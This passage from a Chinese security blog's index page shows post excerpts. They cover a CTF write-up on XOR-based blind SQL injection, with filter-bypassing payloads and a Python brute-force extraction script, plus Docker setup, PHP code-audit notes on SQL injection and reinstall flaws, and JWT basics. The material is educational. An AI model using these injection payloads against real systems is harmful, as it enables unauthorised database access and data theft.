+          <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>文章已投稿至先知社区，具体内容：<a href="https://xz.aliyun.com/t/5356" target="_blank" rel="noopener">从CTF题中学习几种有趣(奇怪)的SQL注入</a></p>
+<h2 id="1-异或注入"><a href="#1-异或注入" class="headerlink" title="1.异或注入"></a>1.异或注入</h2><p>题目地址：<a href="http://119.23.73.3:5004/" target="_blank" rel="noopener">http://119.23.73.3:5004/</a></p>
+<p>在一个师傅的博客中看到这题的Writeup，尝试按照他的payload进行复现，怎么都复现不出来。后来在安全客上看到另一篇异或注入的文章，才把这个题解决了。</p>
+<p>初步测试之后会发现，题目过滤了<code>空格，+，*，or，substr</code>…等一些字符。而且#号注释也不起作用。</p>
+<p>于是尝试异或注入。</p>
+<pre><code>http://119.23.73.3:5004/?id=1&apos;^&apos;1    返回错误
+http://119.23.73.3:5004/?id=1&apos;^&apos;0    返回正常
+</code></pre><p>在MYSQL命令中：</p>
+<p><img src="https://i.loli.net/2019/06/06/5cf89c0da0cab77879.jpg" alt="01_mysql.jpg"></p>
+<p>可见，当/?id=1’^’1时，传递到数据库当中，是id=0，由于为0的id不存在，所以这里返回错误。第二个同理。</p>
+<p>这里属于布尔盲注，于是构造payload，用脚本跑：</p>
+<p>检索数据库：</p>
+<pre><code>id=2&apos;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(schema_name))FROM(information_schema.schemata)),1,1))=104))^&apos;1&apos;=&apos;1
+
+检索出来的库为：information_schema,moctf,mysql,performance_schema
+</code></pre><p>检索表：</p>
+<pre><code>id=2&apos;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(table_name))FROM(information_schema.tables)WHERE(table_schema=&apos;moctf&apos;)),1,1))=104))^&apos;1&apos;=&apos;1
+
+检索出来的表：do_y0u_l1ke_long_t4ble_name,news
+</code></pre><p>检索字段：</p>
+<pre><code>id=2&apos;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(column_name))FROM(information_schema.columns)WHERE(table_name=&apos;do_y0u_l1ke_long_t4ble_name&apos;)),1,1))=104))^&apos;1&apos;=&apos;1
+
+检索出来的字段：d0_you_als0_l1ke_very_long_column_name
+</code></pre><p>读Flag：</p>
+<pre><code>id=2&apos;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(d0_you_als0_l1ke_very_long_column_name))FROM(moctf.do_y0u_l1ke_long_t4ble_name)),1,1))=104))^&apos;1&apos;=&apos;1
+
+moctfb1ind_SQL_1njecti0n_g0od
+</code></pre><p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#文字转ascii ord()</span></span><br><span class="line"><span class="comment">#ascii转文字 ascii()</span></span><br><span class="line"></span><br><span class="line">dic = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,"</span></span><br><span class="line">url = <span class="string">"http://119.23.73.3:5004/?id=2'^"</span></span><br><span class="line">keyword = <span class="string">"Tip"</span></span><br><span class="line">string = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">300</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        payload = <span class="string">"!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(schema_name))FROM(information_schema.schemata)),&#123;0&#125;,1))=&#123;1&#125;))^'1'='1"</span>.format(str(i),ord(j))</span><br><span class="line">        url_get = url + payload</span><br><span class="line">        print(url_get)</span><br><span class="line">        content = requests.get(url_get)</span><br><span class="line">        <span class="keyword">if</span> keyword <span class="keyword">in</span> content.text:</span><br><span class="line">            string += j</span><br><span class="line">            print(string)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"result = "</span> + string)</span><br></pre></td></tr></table></figure>
+<p>跑出来的Flag：</p>
+<p><img src="https://i.loli.net/2019/06/06/5cf89c1236ef825006.jpg" alt="01_getflag.jpg"><br>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/06/09/从CTF题中学习几种有趣(奇怪)的SQL注入/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </p></div>
+
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
+  </div>
+  
+  
+  
+  </article>
+
+    
+      
+
+  <article class="post" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/06/初探Docker之搭建CTF平台/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Threezh1">
+      <meta itemprop="description" content="Share learn & Share life.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Threezh1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/06/06/初探Docker之搭建CTF平台/" class="post-title-link" itemprop="url">初探Docker之搭建CTF平台</a>
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-06-06 15:03:40" itemprop="dateCreated datePublished" datetime="2019-06-06T15:03:40+08:00">2019-06-06</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:19:25" itemprop="dateModified" datetime="2019-08-23T14:19:25+08:00">2019-08-23</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">in</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Learning/" itemprop="url" rel="index"><span itemprop="name">Learning</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>腾讯10元学生机 <a href="https://cloud.tencent.com/act/campus?fromSource=gwzcw.1110156.1110156.1110156&amp;gclid=CjwKCAjw0N3nBRBvEiwAHMwvNlylCbGdNZtjAnOQXkyllVSfCVgTS8gvywBaaFainLdyhJDNkvadPhoCgjQQAvD_BwE" target="_blank" rel="noopener">购买</a><br>也可以使用阿里云的学生机，都很便宜。</p>
+<p>这里我选择了Ubuntu系统。</p>
+<h2 id="安装Docker-Docker-compose"><a href="#安装Docker-Docker-compose" class="headerlink" title="安装Docker + Docker-compose"></a>安装Docker + Docker-compose</h2><ul>
+<li>安装Docker：</li>
+</ul>
+<p>可以参考这个：<a href="https://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">Ubuntu Docker 安装</a></p>
+<pre><code>安装最新的docker
+wget -qO- https://get.docker.com/ | sh
+
+安装完会有一个提示，按照提示去执行
+sudo usermod -aG docker ubuntu
+</code></pre><p>命令执行完成之后，执行 <code>docker verison</code> 来查看是否安装完成。</p>
+<p><img src="https://i.loli.net/2019/06/06/5cf8b92a35cbe47448.jpg" alt="anzhuangdocker.jpg"></p>
+<ul>
+<li>安装Docker-compose：</li>
+</ul>
+<p>参考：<a href="https://github.com/docker/compose/releases" target="_blank" rel="noopener">https://github.com/docker/compose/releases</a></p>
+<p>因为我的腾讯云不是root权限，在执行命令前要加sudo</p>
+<pre><code>sudo curl -L https://github.com/docker/compose/releases/download/1.25.0-rc1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose
+
+sudo chmod +x /usr/local/bin/docker-compose
+</code></pre><p>同样的，命令执行完成之后，执行 <code>docker-compose verison</code> 来查看是否安装完成。</p>
+<p><img src="https://i.loli.net/2019/06/06/5cf8b92a4434a94613.jpg" alt="anzhuangdockercompose.jpg"><br>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/06/06/初探Docker之搭建CTF平台/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </p></div>
+
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
+  </div>
+  
+  
+  
+  </article>
+
+    
+      
+
+  <article class="post" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/29/PHP代码审计之SQL注入与审计流程/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Threezh1">
+      <meta itemprop="description" content="Share learn & Share life.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Threezh1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/05/29/PHP代码审计之SQL注入与审计流程/" class="post-title-link" itemprop="url">PHP代码审计之学习SQL注入与审计流程</a>
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-05-29 00:00:00" itemprop="dateCreated datePublished" datetime="2019-05-29T00:00:00+08:00">2019-05-29</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:18:08" itemprop="dateModified" datetime="2019-08-23T14:18:08+08:00">2019-08-23</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">in</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>本来只想复现一下sql注入的几篇文章，但在先知上找到了几篇非常好的入门审计的文章。于是打算按照他的审计思路，熟悉一下PHP代码审计流程，同时整理一下SQL注入的审计方法。</p>
+<p>文章地址：<a href="https://xz.aliyun.com/t/3532" target="_blank" rel="noopener">https://xz.aliyun.com/t/3532</a></p>
+<h2 id="过程一-了解网站的基本架构"><a href="#过程一-了解网站的基本架构" class="headerlink" title="过程一 了解网站的基本架构"></a>过程一 了解网站的基本架构</h2><p>文章是拿PbootCMS1.2.1来做演示。 安装好系统，配置好数据库信息，阅读一下网站开发手册。</p>
+<p>在审计之前，可以先做以下事情：</p>
+<pre><code>1. 了解网站目录结构
+使用 tree &gt; tree.txt 来生成文件树。快速了解系统。
+
+2. 确定路由走向
+一般是mvc的路由，这个cms还包含自定义路由。
+</code></pre><h2 id="过程二-了解系统参数与底层过滤情况"><a href="#过程二-了解系统参数与底层过滤情况" class="headerlink" title="过程二 了解系统参数与底层过滤情况"></a>过程二 了解系统参数与底层过滤情况</h2><pre><code>1.    了解系统参数过滤的情况
+    a)原生GET,POST,REUQEST最简单的方法就是找一个系统中外部可访问的方法，使用
+    var_dump($_GET);
+    var_dump($_POST);
+    var_dump($_REQUEST);
+    来查看过滤情况
+
+    文章使用了一个留言新增点，添加了上方语句之后。
+    访问:/index.php/Message/add?test=&apos;&quot;;!-=$%^{()}&lt;&gt;
+    用此来检测原始数据的过滤情况
+
+    b)系统外部变量获取函数 get()，post()，request()
+    可以直接使用seay搜索&quot;get(&quot;来寻找到get数据处理的函数。
+
+2.    了解数据库底层运行方式
+    了解数据库增删查改的函数，查看是否有过滤。
+    seay搜索：insert( 等。
+</code></pre>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/05/29/PHP代码审计之SQL注入与审计流程/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
+  </div>
+  
+  
+  
+  </article>
+
+    
+      
+
+  <article class="post" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/26/强网杯upload Writeup与简单分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Threezh1">
+      <meta itemprop="description" content="Share learn & Share life.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Threezh1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/05/26/强网杯upload Writeup与简单分析/" class="post-title-link" itemprop="url">强网杯upload Writeup与简单分析</a>
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-05-26 17:14:26" itemprop="dateCreated datePublished" datetime="2019-05-26T17:14:26+08:00">2019-05-26</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:19:37" itemprop="dateModified" datetime="2019-08-23T14:19:37+08:00">2019-08-23</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">in</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>第一次打强网杯，没想到这么难，萌新瑟瑟发抖。BY Threezh1</p>
+<p>题目有点绕，看了半天都没找到重点。后面还是靠学长给的payload思路理清楚了过程。这里就记录一下，学习学习。</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p><strong>网站基本功能：</strong></p>
+<p>注册登录后，可以上传一张图片作为头像。</p>
+<p>无论上传什么格式的文件，文件名都会修改为<code>md5值.png</code></p>
+<p><strong>分析：</strong></p>
+<p>使用dirsearch等工具可以直接扫到网站源码地址：</p>
+<p><a href="http://49.4.6.176:32288/www.tar.gz" target="_blank" rel="noopener">http://49.4.6.176:32288/www.tar.gz</a></p>
+<p>框架为TP5，直接看application/web/controller目录。包括了以下几个模块，分别对应了网站的几个功能。由于Login.php里没有对解题有用的信息，我们就只看其他三个页面。</p>
+<pre><code>Index.php         //账户首页
+Login.php         //登陆
+Profile.php     //上传
+Register.php     //注册
+</code></pre>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/05/26/强网杯upload Writeup与简单分析/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
+  </div>
+  
+  
+  
+  </article>
+
+    
+      
+
+  <article class="post" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/18/PHP代码审计之重装漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Threezh1">
+      <meta itemprop="description" content="Share learn & Share life.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Threezh1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/05/18/PHP代码审计之重装漏洞/" class="post-title-link" itemprop="url">PHP代码审计之重装漏洞</a>
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-05-18 00:00:00" itemprop="dateCreated datePublished" datetime="2019-05-18T00:00:00+08:00">2019-05-18</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:08:41" itemprop="dateModified" datetime="2019-08-23T14:08:41+08:00">2019-08-23</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">in</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="重装漏洞"><a href="#重装漏洞" class="headerlink" title="重装漏洞"></a>重装漏洞</h2><p>根据大佬们的总结，重装漏洞可以以下几种类型：</p>
+<ol>
+<li><p>自动删除这个安装文件</p>
+<p> 通过生成一个lock文件来判断程序是否安装过</p>
+</li>
+<li><p>根本无验证</p>
+<p> 安装完成后不会自动删除文件，又不会生成lock判断是否安装过</p>
+</li>
+<li><p>安装file</p>
+<p> 直接用GET提交step绕过，直接进入下一步</p>
+</li>
+<li><p>变量覆盖导致重装</p>
+<p> 可以GET,POST,COOKIE 任意提交一个变量名$insLockfile,给其赋空值，覆盖掉$insLockfile,从而让file_exists为false就不会退出</p>
+</li>
+<li><p>判断lock后，无exit</p>
+<p> 判断是否存在lock文件，如果存在lock文件，就会header到index.php,但是header后并没有exit，所以 并不会退出，类似的还有javascript弹个框</p>
+</li>
+<li><p>解析漏洞</p>
+<p> 在安装完成后会将install.php 重命名为index.php.bak,但是由于Apache的解析漏洞：如果无法识别到最后一个后缀的话，就会向上解析，那么就又变成了php了，然后结合安装时的变量覆盖又成重装了。</p>
+</li>
+<li><p>满足一些条件不会退出的</p>
+</li>
+</ol>
+<p>这次复现的两个漏洞，都属于第五类。当页面跳转到主页之后，原来的php进程依然存在，导致可以重装，而当配置信息没有经过过滤而被直接写入了文件当中，就可能会导致getshell。寻找此类漏洞应该尝试去跟踪配置信息的最终去处，并检查是否有过滤。通过构造闭合语句利用漏洞。</p>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/05/18/PHP代码审计之重装漏洞/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
+  </div>
+  
+  
+  
+  </article>
+
+    
+      
+
+  <article class="post" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/17/JWT备忘录/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Threezh1">
+      <meta itemprop="description" content="Share learn & Share life.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Threezh1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/05/17/JWT备忘录/" class="post-title-link" itemprop="url">JWT备忘录</a>
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-05-17 14:08:22" itemprop="dateCreated datePublished" datetime="2019-05-17T14:08:22+08:00">2019-05-17</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:17:43" itemprop="dateModified" datetime="2019-08-23T14:17:43+08:00">2019-08-23</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">in</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Learning/" itemprop="url" rel="index"><span itemprop="name">Learning</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>这一段时间遇到两次JWT的CTF题，本想好好整理一下，结果搜到一篇文章把我想整理的全写出来了。</p>
+<p>文章地址：<a href="https://www.anquanke.com/post/id/145540" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145540</a></p>
+<p>所以这里就只作为一个备忘录，简单总结一下。</p>
+<h2 id="JWT-JSON-Web-Token"><a href="#JWT-JSON-Web-Token" class="headerlink" title="JWT (JSON Web Token)"></a>JWT (JSON Web Token)</h2><p>最常用的网址：<a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p>
+<p>JWT由三部分组成：Header(头部), Payload(负载), Signature(签名)</p>
+<pre><code>格式为：
+Header.Payload.Signature
+
+例如：(HS256)
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+或 (RS256)
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.POstGetfAytaZS82wHcjoTyoqhMyxXiWdR7Nn7A29DNSl0EiXLdwJ6xC6AfgZWF1bOsS_TuYI3OG85AmiExREkrS6tDfTQ2B3WXlrr-wp5AokiRbz3_oB4OxG-W9KcEEbDRcZc0nH3L7LzYptiy1PtAylQGxHTWZXtGz4ht0bAecBgmpdgXMguEIcoqPJ1n3pIWk_dUZegpqx0Lka21H6XxUTxiy8OcaarA8zdnPUnV6AmNP3ecFawIFYdvJB_cm-GvpCSbr8G8y_Mllj8f4x9nBH8pQux89_6gUY618iYv7tuPWBFfEbLxtF2pZS6YC1aSfLQxeNe8djT9YjpvRZA
+</code></pre><p>Header:</p>
+<pre><code>{
+  &quot;alg&quot;: &quot;HS256&quot;,
+  &quot;typ&quot;: &quot;JWT&quot;
+}
+
+alg属性表示签名的算法 (默认是 HMAC SHA256 即HS256)
+typ属性表示这个令牌（token）的类型（type），JWT 令牌统一写为JWT
+</code></pre><p>Payload:</p>
+<pre><code>{
+  &quot;sub&quot;: &quot;1234567890&quot;,
+  &quot;name&quot;: &quot;John Doe&quot;,
+  &quot;admin&quot;: true
+}
+
+除了官方字段，还可以添加自定义字段。如这里的admin字段就是自定义字段。
+</code></pre><p>Signature:</p>
+<pre><code>Signature 部分是对前两部分的签名，防止数据篡改。
+
+服务器使用一个指定的密钥，按照下面的签名算法(默认为HS256)产生签名
+(RS256有一个公钥和一个私钥)
+
+HMACSHA256(
+  base64UrlEncode(header) + &quot;.&quot; +
+  base64UrlEncode(payload),
+  secret)
+
+RSASHA256(
+  base64UrlEncode(header) + &quot;.&quot; +
+  base64UrlEncode(payload),
+  PUBLIC KEY, PRIVATE KEY)
+</code></pre><p>然后将这三个部分分别base64编码后用“.”连接生成JSON Web Token</p>
+<p>话说文章里面的名字取的还蛮不错的。<br>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/05/17/JWT备忘录/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </p></div>
+
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
+  </div>
+  
+  
+  
+  </article>
+
+    
+  </section>
+
+  
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Nächste Seite"></i></a>
+  </nav>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc" data-target="post-toc-wrap">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Threezh1</p>
+  <div class="site-description motion-element" itemprop="description">Share learn & Share life.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">Kategorien</span>
+        
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">schlagwörter</span>
+        
+      </div>
+    
+  </nav>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Threezh1" title="GitHub &rarr; https://github.com/Threezh1" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://weibo.com/u/5515566558" title="Weibo &rarr; https://weibo.com/u/5515566558" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+    
+  </div>
+
+
+
+        </div>
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Threezh1</span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+  <span class="post-meta-divider">|</span>
